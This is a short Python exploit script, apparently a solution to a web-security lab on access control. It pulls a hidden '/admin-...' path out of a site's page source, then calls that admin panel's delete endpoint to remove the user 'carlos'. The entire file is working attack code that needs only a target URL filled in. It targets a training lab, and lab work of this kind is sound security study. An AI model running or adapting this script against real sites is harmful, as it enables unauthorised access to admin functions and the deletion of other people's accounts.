import requests
import re

target_URL = "YOUR_URL"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
}

session = requests.Session()
session.headers.update(headers)

res = session.get(target_URL)
print(f"[*] Home page status: {res.status_code}")

match = re.search(r"'/admin-[a-zA-Z0-9]+'", res.text)

if match:
    admin_path = match.group(0).replace("'", "")
    admin_URL = target_URL + admin_path
    print(f"[+] Found admin URL: {admin_URL}")

    delete_URL = f"{admin_URL}/delete?username=carlos"
    del_user = session.get(delete_URL, allow_redirects=True)

    if del_user.status_code == 200:
        print("[!] Delete successfully (Check the lab status)")
    else:
        print(f"[-] Delete failed. Status code: {del_user.status_code}")
else:
    print("[-] Could not find admin URL in the page source.")